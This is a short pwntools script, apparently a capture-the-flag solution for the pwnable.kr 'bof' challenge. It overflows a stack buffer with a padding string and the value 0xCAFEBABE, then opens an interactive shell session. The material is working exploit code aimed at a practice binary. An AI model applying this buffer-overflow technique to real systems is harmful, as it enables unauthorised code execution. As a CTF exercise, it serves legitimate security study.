#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
context.log_level = 'debug'

io = process('./bof')
#io = remote('pwnable.kr', 9000)

payload = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1'#len = 0x2C+0x8
payload += p32(0xCAFEBABE)

io.sendlineafter(': \n',payload)

io.interactive()
